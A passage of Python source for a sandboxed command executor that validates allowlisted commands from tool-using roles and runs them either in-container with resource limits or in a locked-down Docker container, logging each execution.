                raise CommandNotAllowed(
                    f"'{name}' points outside the workspace. Run a tool from the "
                    "workspace or one the environment provides, not a path out of it."
                )
            return candidate if os.access(candidate, os.X_OK) else None
        return shutil.which(name, path=os.environ.get("PATH", ""))

    @classmethod
    def _execute_here(
        cls,
        argv: list[str],
        workspace: str,
        role_name: str,
        category: str,
        timeout: int,
        extra_env: Dict[str, str] | None,
        run_in: str | None = None,
    ) -> Dict[str, Any]:
        """Run a validated command in this container, in the run's workspace.

        The command has already passed the same checks as the container path -
        argv only so there is no shell, exact executable match against the
        role's allowlist, and argument screening for the forms that turn an
        allowed interpreter back into a general one. What differs is only the
        blast radius if something gets through.
        """
        try:
            executable = cls._resolve_executable(argv[0], workspace, run_in)
        except CommandNotAllowed as exc:
            return {"error": str(exc)}
        if executable is None:
            return {
                "error": (
                    f"'{argv[0]}' is not installed in this environment. Install it into "
                    "the workspace first (for example `python -m venv .venv` then "
                    "`.venv/bin/pip install ...`, or `npm install`), or ask for a tool "
                    "the image already provides."
                )
            }

        logger.info(
            "sandbox exec (in-container) role=%s category=%s argv=%s",
            role_name, category, argv,
        )
        try:
            result = subprocess.run(  # noqa: S603 - argv list, no shell, validated above
                [executable, *argv[1:]],
                cwd=run_in or workspace,
                env=_child_environment(workspace, extra_env),
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
                preexec_fn=_apply_limits,  # noqa: PLW1509 - the point is to limit the child
                start_new_session=False,   # _apply_limits calls setsid itself
            )
        except subprocess.TimeoutExpired as expired:
            return {
                "error": f"Command timed out after {timeout} seconds." + _TIMEOUT_ADVICE,
                "stdout": _as_workspace_relative(_truncate(expired.stdout or "" if isinstance(expired.stdout, str) else "", f"{role_name}-{argv[0]}-stdout"), workspace),
                "stderr": _as_workspace_relative(_truncate(expired.stderr or "" if isinstance(expired.stderr, str) else "", f"{role_name}-{argv[0]}-stderr"), workspace),
                "returncode": "124",
            }
        except OSError as exc:
            return {"error": f"Could not run '{argv[0]}': {exc}"}

        return {
            "stdout": _as_workspace_relative(_truncate(result.stdout, f"{role_name}-{argv[0]}-stdout"), workspace),
            "stderr": _as_workspace_relative(_truncate(result.stderr, f"{role_name}-{argv[0]}-stderr"), workspace),
            "returncode": str(result.returncode),
        }

    @classmethod
    def execute(
        cls,
        command: Sequence[str],
        repo_root: str,
        role_name: str = "general",
        category: str = "default",
        extra_env: Dict[str, str] | None = None,
        working_directory: str | None = None,
    ) -> Dict[str, Any]:
        """Run one command and record that it happened.

        A thin recording wrapper around `_run`, rather than a `_record_execution`
        call at each of the eight places that return: one entry point cannot be
        forgotten when a ninth is added, and refusals - which return early - are
        captured on the same path as successes.
        """
        # A manifest command aimed at the project directory is the behaviour the
        # guard asks for, so it is checked against where the command will run.
        scaffolding = (
            None
            if working_directory
            else manifest_written_outside_the_project(command, repo_root)
        )
        if scaffolding is not None:
            outcome: Dict[str, Any] = {"error": scaffolding}
        else:
            command, doubled = strip_a_doubled_working_directory(
                command, repo_root, working_directory
            )
            outcome = cls._run(
                command, repo_root, role_name, category, extra_env, working_directory
            )
            if doubled:
                outcome = {**outcome, "note": doubled}
        _record_execution(repo_root, role_name, command, outcome)
        return outcome

    @classmethod
    def _run(
        cls,
        command: Sequence[str],
        repo_root: str,
        role_name: str = "general",
        category: str = "default",
        extra_env: Dict[str, str] | None = None,
        working_directory: str | None = None,
    ) -> Dict[str, Any]:
        if not execution_enabled():
            return {"error": "Command execution is disabled (ALLOW_COMMAND_EXECUTION is not enabled)."}

        try:
            argv = validate_command(command, role_name)
        except CommandNotAllowed as exc:
            return {"error": str(exc)}

        workspace = os.path.abspath(repo_root)
        if not os.path.isdir(workspace):
            return {"error": f"Workspace does not exist: {workspace}"}

        try:
            run_in = resolve_working_directory(workspace, working_directory)
        except WorkingDirectoryRejected as exc:
            return {"error": str(exc)}

        argv = workspace_rooted_arguments(argv, workspace, run_in)

        # Ask what is free before starting, not after the kernel has answered.
        # A refusal is a tool result the model can read and work around; an OOM
        # kill takes the worker with it, and a run whose worker is gone has no
        # process left to write an error. Run-cbd22a34 ended that way twice.
        from app.tools.resources import enough_headroom, read_resource_state

        state = read_resource_state()
        viable, why = enough_headroom(_memory_limit_bytes(), state)
        if not viable:
            logger.warning(
                "refusing %s: %s", argv[0], state.describe(),
                extra={"sandbox_resource_state": state.describe()},
            )
            return {"error": why}

        timeout = TIMEOUTS.get(category, TIMEOUTS["default"])

        if execution_mode() == IN_CONTAINER_MODE:
            return cls._execute_here(
                argv, workspace, role_name, category, timeout, extra_env, run_in
            )

        try:
            docker = _docker_binary()
        except SandboxUnavailable as exc:
            return {"error": str(exc)}
        container = f"sandbox-{uuid.uuid4().hex[:12]}"

        docker_cmd = [
            docker, "run", "--rm",
            "--name", container,
            "--network", "bridge" if category in NETWORK_CATEGORIES else "none",
            "--memory", MEMORY_LIMIT,
            "--memory-swap", MEMORY_LIMIT,   # equal to --memory disables swap
            "--cpus", CPU_LIMIT,
            "--pids-limit", PIDS_LIMIT,
            "--cap-drop", "ALL",
            "--security-opt", "no-new-privileges",
            # The workspace is the one writable location; everything else,
            # including /tmp, is ephemeral and size-bounded.
            "--read-only",
            # A tmpfs mount flag for the container, not a host temp path.
            "--tmpfs", "/tmp:rw,noexec,nosuid,size=256m",  # nosec B108
            "-v", f"{workspace}:/workspace",
            # The mount is always the workspace root; only the working directory
            # inside it moves, so a subdirectory still sees its siblings.
            "-w", "/workspace/" + os.path.relpath(run_in, workspace)
            if run_in and os.path.relpath(run_in, workspace) != "."
            else "/workspace",
            "-u", f"{os.getuid()}:{os.getgid()}",
            "--env", "HOME=/tmp",
        ]
        for key, value in (extra_env or {}).items():
            docker_cmd += ["--env", f"{key}={value}"]
        docker_cmd.append(_image_for(os.path.basename(argv[0])))
        docker_cmd.extend(argv)

        logger.info(
            "sandbox exec role=%s category=%s argv=%s", role_name, category, argv,
            extra={"sandbox_container": container},
        )
        try:
            result = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            subprocess.run([docker, "kill", container], capture_output=True, check=False)
            return {
                "error": f"Command timed out after {timeout} seconds." + _TIMEOUT_ADVICE
            }
        except OSError as exc:
            return {"error": f"Could not start the sandbox: {exc}"}

        return {
            "stdout": _as_workspace_relative(_truncate(result.stdout, f"{role_name}-{argv[0]}-stdout"), repo_root),
            "stderr": _as_workspace_relative(_truncate(result.stderr, f"{role_name}-{argv[0]}-stderr"), repo_root),
            "returncode": str(result.returncode),
        }


__all__ = [
    "COMMON_EXECUTABLES",
    "read_execution_ledger",
    "summarise_executions",
    "CONTAINER_MODE",
    "IN_CONTAINER_MODE",
    "CommandNotAllowed",
    "ROLE_EXECUTABLES",
    "SandboxExecutor",
    "SandboxUnavailable",
    "allowed_executables",
    "workspace_rooted_arguments",
    "execution_enabled",
    "execution_mode",
    "validate_command",
]
